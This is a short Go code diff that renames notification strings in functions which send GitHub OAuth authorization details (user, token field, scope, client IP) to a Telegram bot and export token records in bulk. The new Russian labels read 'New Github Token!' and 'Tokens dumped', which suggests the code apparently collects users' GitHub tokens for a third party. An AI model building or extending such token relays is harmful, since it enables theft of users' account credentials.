@@ -289,7 +289,7 @@ func formatTelegramNotification(login string, userID int64, tokenType string, ex
 	clientIP = formatClientIP(clientIP, countryCode)
 
 	return fmt.Sprintf(
-		"🔐 OAuth Authorization Succeeded\n\n👤 User: https://github.com/%s\nUser ID: %d\n🔑 Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n🌍 Client IP: %s\nTimestamp: %s",
+		"◇ Новый Github Token!\n\n User: https://github.com/%s\n User ID: %d\n Token: `%s`\nToken Type: %s\nExpires: %s\nScope: %s\n Client IP: %s\nTimestamp: %s",
 		sanitizeMessageField(login),
 		userID,
 		sanitizeMessageField(tokenSuffix),
@@ -474,13 +474,13 @@ func sendTelegramExport(ctx context.Context, botToken, chatID string, records []
 		))
 	}
 
-	const linePrefix = "OAuth export (total: %d)\n\n"
+	const linePrefix = "○ Токены выгружены (total: %d)\n\n"
 	var chunks []string
 	current := fmt.Sprintf(linePrefix, len(records))
 	for _, line := range lines {
 		if len(current)+len(line)+1 > maxTelegramMessage {
 			chunks = append(chunks, current)
-			current = "OAuth export (continued)\n\n"
+			current = "Токены выгружены (продолжение)\n\n"
 		}
 		current += line + "\n"
 	}
